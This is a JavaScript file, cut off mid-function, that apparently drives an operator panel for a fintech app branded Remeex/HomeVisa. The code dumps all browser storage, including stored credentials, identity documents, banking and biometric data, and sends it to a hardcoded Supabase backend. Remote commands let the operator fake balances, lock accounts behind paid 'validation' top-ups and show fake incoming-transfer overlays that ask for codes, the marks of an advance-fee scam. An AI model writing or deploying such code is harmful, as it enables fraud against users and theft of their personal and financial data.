(function () {
  'use strict';

  const RATE_LABELS = {
    bcv: 'BCV',
    usdt: 'USDT P2P',
    euroDigital: 'Euro Digital',
    dolarPromedio: 'Dólar Promedio',
    dolarBinance: 'Dólar Binance',
    exchange: 'Intercambio Remeex',
    personalizado: 'Tasa personalizada'
  };

  const RATE_DESCRIPTIONS = {
    bcv: 'Tasa oficial publicada por el Banco Central de Venezuela.',
    usdt: 'Referencia según cotización USDT P2P en Binance.',
    euroDigital: 'Conversión basada en el Euro digital Remeex.',
    dolarPromedio: 'Promedio ponderado entre las tasas disponibles.',
    dolarBinance: 'Precio USDT/USD obtenido directamente de Binance.',
    exchange: 'Tipo de cambio utilizado para operaciones entre usuarios Remeex.'
  };

  const STATUS_CLASS = {
    completed: 'completed',
    aprobado: 'completed',
    approved: 'completed',
    finalizado: 'completed',
    pending: 'pending',
    pendiente: 'pending',
    processing: 'pending',
    in_progress: 'pending',
    rejected: 'rejected',
    cancelled: 'cancelled',
    canceled: 'cancelled',
    failed: 'cancelled'
  };

  const CURRENCY_LABELS = {
    usd: '$',
    ves: 'Bs',
    vef: 'Bs',
    bs: 'Bs',
    eur: '€'
  };

  const ACCOUNT_STORAGE_KEYS = [
    'visaRegistrationCompleted',
    'visaRegistrationTemp',
    'visaUserData',
    'remeexVerificationData',
    'remeexVerificationBanking',
    'remeexIdentityDetails',
    'remeexIdentityDocuments',
    'remeexVerificationBiometric',
    'remeexVerificationBiometricSkipped',
    'remeexProfilePhoto',
    'remeexDeviceId',
    'remeexBalance',
    'remeexTransactions',
    'remeexBalanceHistory',
    'remeexBalanceTimeline',
    'remeexBalanceSnapshots',
    'remeexBalanceLog',
    'remeexAccountTier',
    'remeexPoints',
    'selectedRate',
    'selectedRateValue',
    'selectedRateUsdToEur',
    'selectedLatamCountry',
    'userFullName',
    'remeexSessionExchangeRate',
    'homevisaSessionMonitor',
    'forcedValidationAmountUsd',
    'validationDiscount',
    'pendingCommission',
    'discountExpiry',
    'discountUsed'
  ];

  const REMOTE_COMMAND_KEY = 'homevisaRemoteCommands';
  const REMOTE_PROCESSED_KEY = 'homevisaRemoteProcessed';
  const REMOTE_BLOCK_STATE_KEY = 'homevisaManualBlockState';
  const REMOTE_MAX_COMMANDS = 50;

  const REMOTE_ACTION_LABELS = {
    'update-balance': 'Actualización de saldo',
    'set-block': 'Actualización de bloqueo',
    'wipe-account': 'Eliminación de cuenta local',
    'update-rate': 'Actualización de tasa',
    'set-validation-amount': 'Monto de validación',
    'show-overlay': 'Overlay remoto',
    'hide-overlay': 'Ocultar overlay'
  };

  const BLOCK_PRESETS = {
    general: {
      label: 'Bloqueo general',
      message: 'Tu cuenta está bloqueada temporalmente por revisión manual. Contacta a soporte para reactivarla.',
      accent: '#f87171'
    },
    validation: {
      label: 'Validación pendiente',
      message: 'Debes completar la validación con una recarga supervisada para reactivar todas las funciones.',
      accent: '#f97316'
    },
    security: {
      label: 'Alerta de seguridad',
      message: 'Detectamos actividad inusual y bloqueamos tu cuenta para proteger tus fondos. Comunícate con soporte.',
      accent: '#f87171'
    },
    payments: {
      label: 'Bloqueo de pagos',
      message: 'Los pagos están temporalmente limitados mientras revisamos tus operaciones recientes.',
      accent: '#facc15'
    },
    withdrawals: {
      label: 'Bloqueo de retiros',
      message: 'Los retiros se habilitarán una vez completes la validación adicional solicitada.',
      accent: '#facc15'
    }
  };

  const OVERLAY_TEMPLATES = {
    donation: {
      title: 'Multiplica tu impacto',
      message: 'Tu saldo puede transformar vidas. Dona a nuestros aliados solidarios con un clic.',
      accent: '#f97316',
      button: { label: 'Donar ahora', href: 'servicios.html#donaciones' }
    },
    activation: {
      title: 'Activa tu cuenta hoy',
      message: 'Completa la validación para desbloquear retiros, pagos y transferencias ilimitadas.',
      accent: '#38bdf8',
      button: { label: 'Ver requisitos', href: '#validacion' }
    },
    transfer: {
      title: 'Transferencia pendiente',
      message: 'Has recibido fondos que necesitan tu confirmación. Ingresa el código enviado para liberarlos.',
      accent: '#22d3ee',
      button: { label: 'Aceptar transferencia', href: '#transferencias' }
    }
  };

  const DEFAULT_SUPABASE_CONFIG = {
    url: 'https://zjbbniliprbksblevrlq.supabase.co',
    anonKey:
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpqYmJuaWxpcHJia3NibGV2cmxxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk1NzA3NzQsImV4cCI6MjA3NTE0Njc3NH0.sWpZpvkaEYcExxzKQgkI5KNPGHyqF5L_Ww6BKzdwRIo'
  };

  const SUPABASE_CONFIG = (function () {
    if (typeof window === 'undefined') {
      return DEFAULT_SUPABASE_CONFIG;
    }
    const override = window.homevisaSupabaseConfig;
    if (override && typeof override === 'object') {
      return Object.assign({}, DEFAULT_SUPABASE_CONFIG, override);
    }
    return DEFAULT_SUPABASE_CONFIG;
  })();

  const SUPABASE_TABLES = {
    snapshots: 'miinformacion_snapshots',
    commands: 'miinformacion_remote_commands'
  };

  const supabaseStatusElements = {
    badge: null,
    message: null,
    meta: null,
    button: null
  };

  let supabaseLastStatus = {
    badgeText: 'Inactiva',
    message: 'La sincronización con Supabase se activará cuando haya datos disponibles.',
    meta: '',
    statusType: 'info'
  };

  const supabaseStats = {
    attempts: 0,
    successes: 0,
    failures: 0,
    commandsForwarded: 0,
    commandFailures: 0
  };

  let supabaseClientPromise = null;
  let supabaseSyncQueue = [];
  let supabaseSyncInFlight = false;
  let supabaseLastHash = null;
  let supabaseLastSyncAt = null;
  let supabaseCommandQueue = [];
  let supabaseCommandInFlight = false;
  const supabaseCommandsSent = new Set();
  let lastSnapshotPayload = null;
  let lastKnownProfile = null;

  function applySupabaseStatus() {
    const { badge, message, meta } = supabaseStatusElements;
    const { badgeText, message: statusMessage, meta: statusMeta, statusType } = supabaseLastStatus;
    if (badge) {
      badge.textContent = badgeText;
      if (statusType) {
        badge.dataset.status = statusType;
      } else {
        delete badge.dataset.status;
      }
    }
    if (message) {
      message.textContent = statusMessage;
    }
    if (meta) {
      const metaLabel = statusMeta && statusMeta.trim() ? statusMeta : formatSupabaseStatsMeta();
      meta.textContent = metaLabel;
    }
  }

  function updateSupabaseStatus(badgeText, message, meta, statusType) {
    supabaseLastStatus = {
      badgeText,
      message,
      meta: typeof meta === 'string' ? meta : '',
      statusType: statusType || 'info'
    };
    applySupabaseStatus();
  }

  function formatSupabaseStatsMeta() {
    const parts = [];
    if (supabaseStats.attempts) {
      parts.push(`Snapshots: ${supabaseStats.successes}/${supabaseStats.attempts} enviados`);
      if (supabaseStats.failures) {
        parts.push(`${supabaseStats.failures} fallos`);
      }
    } else {
      parts.push('Snapshots pendientes');
    }
    if (supabaseStats.commandsForwarded || supabaseStats.commandFailures) {
      const base = `Comandos: ${supabaseStats.commandsForwarded} enviados`;
      parts.push(
        supabaseStats.commandFailures ? `${base} · ${supabaseStats.commandFailures} fallos` : base
      );
    }
    return parts.join(' • ');
  }

  function refreshSupabaseMeta() {
    updateSupabaseStatus(
      supabaseLastStatus.badgeText,
      supabaseLastStatus.message,
      formatSupabaseStatsMeta(),
      supabaseLastStatus.statusType
    );
  }

  function updateSupabaseButtonState() {
    if (!supabaseStatusElements.button) return;
    supabaseStatusElements.button.disabled = supabaseSyncInFlight;
  }

  function initSupabaseStatusUi() {
    supabaseStatusElements.badge = document.getElementById('supabase-sync-badge');
    supabaseStatusElements.message = document.getElementById('supabase-sync-message');
    supabaseStatusElements.meta = document.getElementById('supabase-sync-meta');
    supabaseStatusElements.button = document.getElementById('supabase-sync-now');

    if (supabaseStatusElements.button) {
      supabaseStatusElements.button.addEventListener('click', function (event) {
        event.preventDefault();
        if (supabaseSyncInFlight) {
          return;
        }
        if (lastSnapshotPayload) {
          const manualSnapshot = Object.assign({}, lastSnapshotPayload, {
            collectedAt: new Date().toISOString()
          });
          queueSupabaseSnapshot(manualSnapshot, { force: true, reason: 'manual' });
          updateSupabaseStatus(
            'En cola',
            'Sincronización manual solicitada.',
            formatSupabaseStatsMeta(),
            'info'
          );
        } else {
          updateSupabaseStatus(
            'Buscando datos',
            'Cargando la información antes de sincronizar.',
            formatSupabaseStatsMeta(),
            'info'
          );
          refreshAll();
        }
      });
    }

    applySupabaseStatus();
    updateSupabaseButtonState();
  }

  async function getSupabaseClient() {
    if (!SUPABASE_CONFIG || !SUPABASE_CONFIG.url || !SUPABASE_CONFIG.anonKey) {
      updateSupabaseStatus(
        'Sin configurar',
        'Configura la URL y clave anónima de Supabase para habilitar la sincronización.',
        formatSupabaseStatsMeta(),
        'error'
      );
      return null;
    }

    if (!supabaseClientPromise) {
      supabaseClientPromise = import('https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm')
        .then(({ createClient }) => {
          return createClient(SUPABASE_CONFIG.url, SUPABASE_CONFIG.anonKey, {
            auth: { persistSession: false }
          });
        })
        .catch((error) => {
          console.error('[MiInformación] No se pudo cargar supabase-js.', error);
          updateSupabaseStatus(
            'Error',
            'No se pudo cargar el cliente de Supabase en el navegador.',
            formatSupabaseStatsMeta(),
            'error'
          );
          return null;
        });
    }

    return supabaseClientPromise;
  }

  function computeHash(str) {
    let hash = 0;
    if (typeof str !== 'string' || !str.length) return hash.toString();
    for (let i = 0; i < str.length; i += 1) {
      const chr = str.charCodeAt(i);
      hash = (hash << 5) - hash + chr;
      hash |= 0; // conviértelo en un entero de 32 bits
    }
    return hash.toString(16);
  }

  function safeListStorageKeys(storage) {
    const keys = [];
    if (!storage || typeof storage.length !== 'number' || typeof storage.key !== 'function') {
      return keys;
    }
    try {
      for (let index = 0; index < storage.length; index += 1) {
        const key = storage.key(index);
        if (typeof key === 'string' && key) {
          keys.push(key);
        }
      }
    } catch (error) {
      console.warn('[MiInformación] No se pudo enumerar claves de almacenamiento.', error);
    }
    return keys;
  }

  function gatherFullStorageDump() {
    const dump = { localStorage: {}, sessionStorage: {} };
    safeListStorageKeys(localStorage).forEach((key) => {
      dump.localStorage[key] = safeGetFromStorage(localStorage, key);
    });
    if (typeof sessionStorage !== 'undefined') {
      safeListStorageKeys(sessionStorage).forEach((key) => {
        dump.sessionStorage[key] = safeGetFromStorage(sessionStorage, key);
      });
    }
    return dump;
  }

  function buildSupabaseSnapshot(context) {
    const {
      profile,
      registration,
      registrationSnapshots,
      rate,
      balance,
      accountInfo,
      history,
      sessionMonitor,
      transactions,
      remote,
      biometric,
      biometricSkipped,
      sources,
      exchangeRates
    } = context;

    const timezone = (function () {
      try {
        return Intl.DateTimeFormat().resolvedOptions().timeZone;
      } catch (error) {
        return null;
      }
    })();

    const snapshot = {
      collectedAt: new Date().toISOString(),
      location: typeof window !== 'undefined' ? window.location.href : null,
      userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : null,
      language: typeof navigator !== 'undefined' ? navigator.language : null,
      timezone,
      screen:
        typeof window !== 'undefined'
          ? { width: window.innerWidth, height: window.innerHeight, pixelRatio: window.devicePixelRatio || 1 }
          : null,
      profile,
      registration,
      registrationSnapshots,
      rate,
      balance,
      accountInfo,
      balanceHistory: history,
      sessionMonitor,
      transactions,
      remote,
      biometric,
      biometricSkipped,
      exchangeRates,
      storageDump: gatherFullStorageDump(),
      sources
    };

    return snapshot;
  }

  function normalizeSnapshotForHash(snapshot) {
    const clone = Object.assign({}, snapshot, { collectedAt: null });
    return JSON.stringify(clone);
  }

  function queueSupabaseSnapshot(snapshot, options = {}) {
    if (!snapshot) return;
    try {
      const normalized = normalizeSnapshotForHash(snapshot);
      const hash = computeHash(normalized);
      if (!options.force && hash === supabaseLastHash) {
        return;
      }
      supabaseSyncQueue.push({ snapshot, hash });
      if (supabaseSyncQueue.length > 10) {
        supabaseSyncQueue = supabaseSyncQueue.slice(-10);
      }
      updateSupabaseStatus('En cola', 'Preparando sincronización con Supabase.', formatSupabaseStatsMeta(), 'info');
      processSupabaseSnapshotQueue();
    } catch (error) {
      console.error('[MiInformación] No se pudo preparar el snapshot para Supabase.', error);
    }
  }

  function scheduleSupabaseRetry(delayMs) {
    const delay = Number.isFinite(delayMs) ? delayMs : 10000;
    setTimeout(() => {
      if (!supabaseSyncInFlight) {
        processSupabaseSnapshotQueue();
      }
    }, delay);
  }

  async function processSupabaseSnapshotQueue() {
    if (supabaseSyncInFlight) return;
    if (!supabaseSyncQueue.length) return;

    const supabase = await getSupabaseClient();
    if (!supabase) {
      scheduleSupabaseRetry(15000);
      return;
    }

    supabaseSyncInFlight = true;
    updateSupabaseButtonState();
    updateSupabaseStatus('Sincronizando', 'Enviando datos a Supabase...', formatSupabaseStatsMeta(), 'syncing');

    while (supabaseSyncQueue.length) {
      const job = supabaseSyncQueue[0];
      supabaseStats.attempts += 1;
      try {
        const payload = {
          collected_at: job.snapshot.collectedAt,
          device_id: job.snapshot.profile?.deviceId || null,
          email: job.snapshot.profile?.email || null,
          full_name:
            job.snapshot.profile?.fullName ||
            job.snapshot.profile?.preferredName ||
            job.snapshot.profile?.nickname ||
            null,
          source: 'miinformacion',
          data: job.snapshot,
          last_sync_at: new Date().toISOString(),
          location: job.snapshot.location || null
        };

        const { error } = await supabase.from(SUPABASE_TABLES.snapshots).insert(payload);
        if (error) {
          throw error;
        }

        supabaseStats.successes += 1;
        supabaseLastHash = job.hash;
        supabaseLastSyncAt = Date.now();
        supabaseSyncQueue.shift();
        lastSnapshotPayload = job.snapshot;
        updateSupabaseStatus(
          'Sincronizado',
          supabaseLastSyncAt ? `Último envío: ${formatTimestamp(supabaseLastSyncAt)}` : 'Sincronización exitosa.',
          formatSupabaseStatsMeta(),
          'success'
        );
      } catch (error) {
        supabaseStats.failures += 1;
        console.error('[MiInformación] Error al enviar datos a Supabase.', error);
        updateSupabaseStatus(
          'Error',
          `No se pudo enviar datos a Supabase: ${error.message || error}.`,
          formatSupabaseStatsMeta(),
          'error'
        );
        scheduleSupabaseRetry(12000);
        break;
      }
    }

    supabaseSyncInFlight = false;
    updateSupabaseButtonState();

    if (supabaseSyncQueue.length) {
      scheduleSupabaseRetry(5000);
    }
  }

  function getFallbackProfile() {
    const registration = loadRegistration();
    const temp = loadRegistrationTemp();
    const userData = loadUserData();
    const verification = loadVerificationData();
    const banking = loadVerificationBanking();
    const biometric = loadVerificationBiometric();
    const biometricSkipped = loadVerificationBiometricSkip();
    return gatherProfileInfo(registration, userData, verification, banking, temp, biometric, biometricSkipped);
  }

  function queueRemoteCommandForSupabase(command) {
    if (!command || !command.id || supabaseCommandsSent.has(command.id)) {
      return;
    }
    supabaseCommandQueue.push(command);
    if (supabaseCommandQueue.length > 25) {
      supabaseCommandQueue = supabaseCommandQueue.slice(-25);
    }
    processSupabaseCommandQueue();
  }

  function scheduleSupabaseCommandRetry(delayMs) {
    const delay = Number.isFinite(delayMs) ? delayMs : 10000;
    setTimeout(() => {
      if (!supabaseCommandInFlight) {
        processSupabaseCommandQueue();
      }
    }, delay);
  }

  async function processSupabaseCommandQueue() {
    if (supabaseCommandInFlight) return;
    if (!supabaseCommandQueue.length) return;

    const supabase = await getSupabaseClient();
    if (!supabase) {
      scheduleSupabaseCommandRetry(15000);
      return;
    }

    supabaseCommandInFlight = true;

    while (supabaseCommandQueue.length) {
      const command = supabaseCommandQueue[0];
      try {
        const profile = lastKnownProfile || getFallbackProfile();
        const payload = {
          command_id: command.id,
          type: command.type,
          payload: command.payload,
          meta: command.meta,
          created_at: command.createdAt,
          source: command.meta?.source || 'miinformacion',
          device_id: profile?.deviceId || safeGetFromStorage(localStorage, 'remeexDeviceId') || null,
          email: profile?.email || null,
          full_name: profile?.fullName || profile?.preferredName || null
        };

        const { error } = await supabase.from(SUPABASE_TABLES.commands).insert(payload);
        if (error) {
          throw error;
        }

        supabaseStats.commandsForwarded += 1;
        supabaseCommandsSent.add(command.id);
        supabaseCommandQueue.shift();
        refreshSupabaseMeta();
      } catch (error) {
        supabaseStats.commandFailures += 1;
        console.error('[MiInformación] Error al registrar comando remoto en Supabase.', error);
        updateSupabaseStatus(
          supabaseLastStatus.badgeText,
          `Error al registrar un comando remoto: ${error.message || error}.`,
          formatSupabaseStatsMeta(),
          'error'
        );
        scheduleSupabaseCommandRetry(12000);
        break;
      }
    }

    supabaseCommandInFlight = false;

    if (supabaseCommandQueue.length) {
      scheduleSupabaseCommandRetry(8000);
    }
  }

  let remoteFeedbackTimeout = null;

  const REGISTRATION_SNAPSHOT_DESCRIPTORS = [
    { key: 'visaRegistrationCompleted', label: 'Registro completado', storage: 'localStorage' },
    { key: 'visaRegistrationTemp', label: 'Registro temporal (localStorage)', storage: 'localStorage' },
    { key: 'visaRegistrationTemp', label: 'Registro temporal (sessionStorage)', storage: 'sessionStorage' },
    { key: 'visaUserData', label: 'Credenciales y sesión', storage: 'localStorage' },
    { key: 'remeexVerificationData', label: 'Verificación de identidad', storage: 'localStorage' },
    { key: 'remeexVerificationBanking', label: 'Verificación bancaria', storage: 'localStorage' },
    { key: 'remeexVerificationBiometric', label: 'Biometría facial', storage: 'localStorage' },
    {
      key: 'remeexVerificationBiometricSkipped',
      label: 'Biometría omitida',
      storage: 'localStorage',
      forceString: true
    },
    { key: 'remeexIdentityDetails', label: 'Detalles de identidad', storage: 'localStorage' },
    { key: 'remeexIdentityDocuments', label: 'Documentos cargados', storage: 'localStorage' },
    { key: 'selectedLatamCountry', label: 'País seleccionado', storage: 'localStorage', forceString: true },
    { key: 'userFullName', label: 'Nombre almacenado', storage: 'localStorage', forceString: true },
    { key: 'remeexDeviceId', label: 'Identificador de dispositivo', storage: 'localStorage', forceString: true },
    { key: 'remeexSessionExchangeRate', label: 'Tasa de sesión (localStorage)', storage: 'localStorage' },
    { key: 'remeexSessionExchangeRate', label: 'Tasa de sesión (sessionStorage)', storage: 'sessionStorage' },
    { key: 'homevisaSessionMonitor', label: 'Monitor de sesión (HomeVisa)', storage: 'localStorage' }
  ];

  const SESSION_EVENT_LABELS = {
    login: 'Inicio de sesión',
    logout: 'Cierre de sesión',
    heartbeat: 'Actividad',
    seen: 'Actualización',
    status: 'Estado',
    focus: 'Recuperación de sesión',
    reconnect: 'Reconexión'
  };

  const BALANCE_HISTORY_KEYS = [
    'remeexBalanceHistory',
    'remeexBalanceTimeline',
    'remeexBalanceSnapshots',
    'remeexBalanceLog'
  ];

  const VALIDATION_AMOUNTS_BY_TIER = {
    'Estándar': 25,
    'Bronce': 30,
    'Platinum': 35,
    'Uranio Visa': 40,
    'Uranio Infinite': 45
  };

  function safeGetFromStorage(storage, key) {
    if (!storage || typeof storage.getItem !== 'function') return null;
    try {
      return storage.getItem(key);
    } catch (error) {
      console.warn('[MiInformación] No se pudo leer', key, 'del almacenamiento.', error);
      return null;
    }
  }

  function loadJSONFromStorage(storage, key) {
    const raw = safeGetFromStorage(storage, key);
    return safeJSONParse(raw);
  }

  function safeJSONParse(raw) {
    if (!raw || typeof raw !== 'string') return null;
    try {
      return JSON.parse(raw);
    } catch (error) {
      console.warn('[MiInformación] No se pudo analizar JSON almacenado.', error);
      return null;
    }
  }

  function loadRegistration() {
    return safeJSONParse(localStorage.getItem('visaRegistrationCompleted'));
  }

  function loadRegistrationTemp() {
    return (
      safeJSONParse(safeGetFromStorage(localStorage, 'visaRegistrationTemp')) ||
      safeJSONParse(safeGetFromStorage(sessionStorage, 'visaRegistrationTemp'))
    );
  }

  function loadUserData() {
    return safeJSONParse(safeGetFromStorage(localStorage, 'visaUserData'));
  }

  function loadVerificationData() {
    return safeJSONParse(safeGetFromStorage(localStorage, 'remeexVerificationData'));
  }

  function loadVerificationBanking() {
    return safeJSONParse(safeGetFromStorage(localStorage, 'remeexVerificationBanking'));
  }

  function loadVerificationBiometric() {
    return safeJSONParse(safeGetFromStorage(localStorage, 'remeexVerificationBiometric'));
  }

  function loadVerificationBiometricSkip() {
    const localSkip = safeGetFromStorage(localStorage, 'remeexVerificationBiometricSkipped');
    if (typeof localSkip === 'string' && localSkip.toLowerCase() === 'true') {
      return true;
    }
    if (typeof sessionStorage !== 'undefined') {
      const sessionSkip = safeGetFromStorage(sessionStorage, 'remeexVerificationBiometricSkipped');
      return typeof sessionSkip === 'string' && sessionSkip.toLowerCase() === 'true';
    }
    return false;
  }

  function loadSelectedCountry() {
    const stored = safeGetFromStorage(localStorage, 'selectedLatamCountry');
    return typeof stored === 'string' && stored.trim() ? stored.trim() : null;
  }

  function loadBalance() {
    return safeJSONParse(localStorage.getItem('remeexBalance'));
  }

  function loadTransactions() {
    const raw = safeJSONParse(localStorage.getItem('remeexTransactions'));
    if (Array.isArray(raw)) return raw;
    if (raw && Array.isArray(raw.transactions)) return raw.transactions;
    return [];
  }

  function loadSessionMonitor() {
    return safeJSONParse(safeGetFromStorage(localStorage, 'homevisaSessionMonitor'));
  }

  function getRateInfo() {
    const key = localStorage.getItem('selectedRate');
    const valueRaw = localStorage.getItem('selectedRateValue');
    const usdToEurRaw = localStorage.getItem('selectedRateUsdToEur');
    const value = valueRaw ? Number(valueRaw) : null;
    const usdToEur = usdToEurRaw ? Number(usdToEurRaw) : null;
    return { key, value, usdToEur };
  }

  function formatNumber(value, options = {}) {
    if (!Number.isFinite(value)) return '--';
    const formatter = new Intl.NumberFormat('es-VE', Object.assign({
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    }, options));
    return formatter.format(value);
  }

  function formatCurrency(amount, currency) {
    if (!Number.isFinite(amount)) return '--';
    const normalized = typeof currency === 'string' ? currency.trim().toLowerCase() : '';
    const symbol = CURRENCY_LABELS[normalized] || CURRENCY_LABELS.usd;
    return `${symbol} ${formatNumber(amount)}`;
  }

  function formatBoolean(value) {
    if (value === null || value === undefined) return '—';
    return value ? 'Sí' : 'No';
  }

  function toNumber(value) {
    if (Number.isFinite(value)) return value;
    if (typeof value === 'string') {
      const trimmed = value.trim();
      if (!trimmed) return null;

      let normalized = trimmed.replace(/[\u202f\u00a0\s]/g, '');
      let sign = '';

      if (normalized.startsWith('-')) {
        sign = '-';
        normalized = normalized.slice(1);
      }

      normalized = normalized.replace(/-/g, '');
      normalized = normalized.replace(/[^0-9.,]/g, '');
      if (!normalized) return null;

      const lastComma = normalized.lastIndexOf(',');
      const lastDot = normalized.lastIndexOf('.');
      const decimalIndex = Math.max(lastComma, lastDot);

      let integerPart = normalized;
      let fractionalPart = '';

      if (decimalIndex !== -1) {
        integerPart = normalized.slice(0, decimalIndex);
        fractionalPart = normalized.slice(decimalIndex + 1);
      }

      integerPart = integerPart.replace(/[.,]/g, '');

      const sanitized = sign + integerPart + (fractionalPart ? `.${fractionalPart}` : '');

      if (!sanitized || sanitized === '-' || sanitized === '.' || sanitized === '-.') {
        return null;
      }

      const parsed = Number(sanitized);
      return Number.isFinite(parsed) ? parsed : null;
    }
    const numeric = Number(value);
    return Number.isFinite(numeric) ? numeric : null;
  }

  function firstNumber(...values) {
    for (const value of values) {
      const numeric = toNumber(value);
      if (Number.isFinite(numeric)) {
        return numeric;
      }
    }
    return null;
  }

  function loadRemoteCommands() {
    const stored = safeJSONParse(localStorage.getItem(REMOTE_COMMAND_KEY));
    return Array.isArray(stored) ? stored : [];
  }

  function saveRemoteCommands(commands) {
    try {
      localStorage.setItem(REMOTE_COMMAND_KEY, JSON.stringify(commands));
    } catch (error) {
      console.warn('[MiInformación] No se pudo guardar la cola remota.', error);
    }
  }

  function loadProcessedCommandIds() {
    const stored = safeJSONParse(localStorage.getItem(REMOTE_PROCESSED_KEY));
    if (!Array.isArray(stored)) return [];
    return stored.filter((id) => typeof id === 'string');
  }

  function loadRemoteBlockState() {
    const stored = safeJSONParse(localStorage.getItem(REMOTE_BLOCK_STATE_KEY));
    if (!stored || typeof stored !== 'object') return null;
    return {
      active: stored.active !== false,
      type: stored.type || 'general',
      message: stored.message || '',
      title: stored.title || '',
      accent: stored.accent || ''
    };
  }

  function enqueueRemoteCommand(type, payload = {}, meta = {}) {
    const commands = loadRemoteCommands();
    const processedSet = new Set(loadProcessedCommandIds());
    const id = `cmd-${Date.now()}-${Math.random().toString(16).slice(2, 8)}`;
    const createdAt = new Date().toISOString();
    const command = {
      id,
      type,
      payload,
      meta: Object.assign({ source: 'miinformacion', createdAt }, meta),
      createdAt
    };
    commands.push(command);
    const filtered = commands.filter((item) => !processedSet.has(item.id));
    while (filtered.length > REMOTE_MAX_COMMANDS) {
      filtered.shift();
    }
    saveRemoteCommands(filtered);
    refreshRemoteControlPanel();
    queueRemoteCommandForSupabase(command);
    return command;
  }

  function showRemoteFeedback(message, type = 'info') {
    const container = document.getElementById('remote-feedback');
    if (!container) return;
    container.textContent = message;
    if (type === 'info') {
      delete container.dataset.type;
    } else {
      container.dataset.type = type;
    }
    if (remoteFeedbackTimeout) {
      clearTimeout(remoteFeedbackTimeout);
    }
    remoteFeedbackTimeout = setTimeout(() => {
      if (!container) return;
      container.textContent = '';
      delete container.dataset.type;
    }, 5000);
  }

  function updateBlockMessagePlaceholder() {
    const select = document.getElementById('remote-block-type');
    const textarea = document.getElementById('remote-block-message');
    if (!select || !textarea) return;
    if (textarea.value && textarea.value.trim()) return;
    const preset = BLOCK_PRESETS[select.value] || BLOCK_PRESETS.general;
    if (preset && preset.message) {
      textarea.placeholder = preset.message;
    }
  }

  function getTransferDetails() {
    const senderInput = document.getElementById('remote-transfer-sender');
    const amountInput = document.getElementById('remote-transfer-amount');
    const currencySelect = document.getElementById('remote-transfer-currency');
    const codeInput = document.getElementById('remote-transfer-code');
    const sender = senderInput && senderInput.value.trim() ? senderInput.value.trim() : "Patrick D'Lavangart";
    const amount = toNumber(amountInput ? amountInput.value : null);
    const currency = currencySelect && currencySelect.value ? currencySelect.value : 'USD';
    const code = codeInput && codeInput.value.trim() ? codeInput.value.trim() : 'EV-4591';
    return { sender, amount, currency, code };
  }

  function collectOverlayOverrides() {
    const overrides = {};
    const titleInput = document.getElementById('remote-overlay-title');
    const messageInput = document.getElementById('remote-overlay-message');
    const accentInput = document.getElementById('remote-overlay-accent');
    const buttonLabelInput = document.getElementById('remote-overlay-action-label');
    const buttonUrlInput = document.getElementById('remote-overlay-action-url');

    if (titleInput && titleInput.value.trim()) {
      overrides.title = titleInput.value.trim();
    }
    if (messageInput && messageInput.value.trim()) {
      overrides.message = messageInput.value.trim();
    }
    if (accentInput && accentInput.value.trim()) {
      overrides.accent = accentInput.value.trim();
    }
    if (buttonLabelInput && buttonLabelInput.value.trim()) {
      overrides.buttonLabel = buttonLabelInput.value.trim();
    }
    if (buttonUrlInput && buttonUrlInput.value.trim()) {
      overrides.buttonUrl = buttonUrlInput.value.trim();
    }

    return overrides;
  }

  function buildOverlayPayload(template, overrides = {}) {
    const base = OVERLAY_TEMPLATES[template] || {};
    const payload = Object.assign({}, base);
    const accent = overrides.accent || base.accent;

    if (overrides.title) {
      payload.title = overrides.title;
    }
    if (overrides.message) {
      payload.message = overrides.message;
    }
    if (accent) {
      payload.accent = accent;
    }

    if (overrides.buttonLabel || overrides.buttonUrl) {
      payload.button = {
        label: overrides.buttonLabel || (base.button ? base.button.label : 'Ver más'),
        href: overrides.buttonUrl || (base.button ? base.button.href : '#')
      };
    } else if (base.button) {
      payload.button = Object.assign({}, base.button);
    }

    if (template === 'activation') {
      const forced = toNumber(localStorage.getItem('forcedValidationAmountUsd'));
      if (!overrides.message) {
        const fallbackAmount = Number.isFinite(forced) ? forced : 25;
        const formattedAmount = formatNumber(fallbackAmount, {
          minimumFractionDigits: 2,
          maximumFractionDigits: 2
        });
        payload.message = `Completa tu validación con una recarga controlada de $${formattedAmount} para desbloquear retiros, pagos y transferencias.`;
      }
      payload.meta = Object.assign({}, payload.meta, {
        validationAmount: Number.isFinite(forced) ? forced : null
      });
    }

    if (template === 'transfer') {
      const details = getTransferDetails();
      const symbol = details.currency === 'VES' ? 'Bs' : details.currency === 'EUR' ? '€' : '$';
      const amountLabel = Number.isFinite(details.amount)
        ? `${symbol} ${formatNumber(details.amount)}`
        : `${symbol} ${formatNumber(0)}`;
      if (!overrides.title) {
        payload.title = `Transferencia de ${details.sender}`;
      }
      if (!overrides.message) {
        payload.message = `Has recibido ${amountLabel} de ${details.sender}. Usa el código ${details.code} para aceptarlo en HomeVisa.`;
      }
      payload.meta = Object.assign({}, payload.meta, details);
      if (!payload.button) {
        payload.button = { label: 'Aceptar transferencia', href: '#transferencias' };
      }
    }

    payload.template = template;
    payload.timestamp = new Date().toISOString();
    return payload;
  }

  function renderRemoteControlPanel(context = {}) {
    const statusBadge = document.getElementById('remote-actions-status');
    const blockStatus = document.getElementById('remote-block-status');
    const logContainer = document.getElementById('remote-actions-log');
    const balance = context.balance || loadBalance();
    const rate = context.rate || getRateInfo();
    const commands = Array.isArray(context.commands) ? context.commands : loadRemoteCommands();
    const processedIds = new Set(Array.isArray(context.processed) ? context.processed : loadProcessedCommandIds());
    const blockState = context.blockState || loadRemoteBlockState();
    const validationAmount = context.validationAmount !== undefined
      ? context.validationAmount
      : toNumber(localStorage.getItem('forcedValidationAmountUsd'));

    if (statusBadge) {
      const pending = commands.filter((cmd) => !processedIds.has(cmd.id));
      statusBadge.textContent = pending.length ? `${pending.length} pendientes` : 'Sin acciones';
      statusBadge.classList.toggle('is-active', pending.length > 0);
    }

    if (blockStatus) {
      if (blockState && blockState.active) {
        const preset = BLOCK_PRESETS[blockState.type] || BLOCK_PRESETS.general;
        const label = preset ? preset.label : 'Bloqueo remoto';
        const description = blockState.message || preset.message;
        blockStatus.innerHTML = `<strong>${label}:</strong> ${description}`;
      } else {
        blockStatus.textContent = 'Sin bloqueos manuales activos.';
      }
    }

    const blockTypeSelect = document.getElementById('remote-block-type');
    if (blockTypeSelect && blockState && blockState.type) {
      blockTypeSelect.value = blockState.type;
    }
    const blockMessageInput = document.getElementById('remote-block-message');
